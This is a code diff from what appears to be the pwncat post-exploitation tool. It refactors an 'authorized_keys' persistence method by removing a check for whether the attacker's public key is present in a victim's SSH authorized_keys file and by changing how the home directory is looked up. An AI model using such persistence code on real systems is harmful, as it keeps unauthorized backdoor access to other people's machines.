@@ -16,46 +16,9 @@ class Method(PersistenceMethod):
     name = "authorized_keys"
     local = False
 
-    def installed(self, user: Optional[str] = None) -> bool:
-
-        homedir = pwncat.victim.users[user]["home"]
-        if not homedir or homedir == "":
-            return False
-
-        # Create .ssh directory if it doesn't exist
-        access = pwncat.victim.access(os.path.join(homedir, ".ssh"))
-        if Access.DIRECTORY not in access or Access.EXISTS not in access:
-            return False
-
-        # Create the authorized_keys file if it doesn't exist
-        access = pwncat.victim.access(os.path.join(homedir, ".ssh", "authorized_keys"))
-        if Access.EXISTS not in access:
-            return False
-        else:
-            try:
-                # Read in the current authorized keys if it exists
-                with pwncat.victim.open(
-                    os.path.join(homedir, ".ssh", "authorized_keys"), "r"
-                ) as filp:
-                    authkeys = filp.readlines()
-            except (FileNotFoundError, PermissionError) as exc:
-                return False
-        try:
-            # Read our public key
-            with open(pwncat.victim.config["privkey"] + ".pub", "r") as filp:
-                pubkey = filp.readlines()
-        except (FileNotFoundError, PermissionError) as exc:
-            return False
-
-        # Ensure we read a public key
-        if not pubkey:
-            return False
-
-        return pubkey[0] in authkeys
-
     def install(self, user: Optional[str] = None):
 
-        homedir = pwncat.victim.users[user]["home"]
+        homedir = pwncat.victim.users[user].homedir
         if not homedir or homedir == "":
             raise PersistenceError("no home directory")
 
@@ -119,7 +82,7 @@ class Method(PersistenceMethod):
 
     def remove(self, user: Optional[str] = None):
 
-        homedir = pwncat.victim.users[user]["home"]
+        homedir = pwncat.victim.users[user].homedir
         if not homedir or homedir == "":
             raise PersistenceError("no home directory")
 
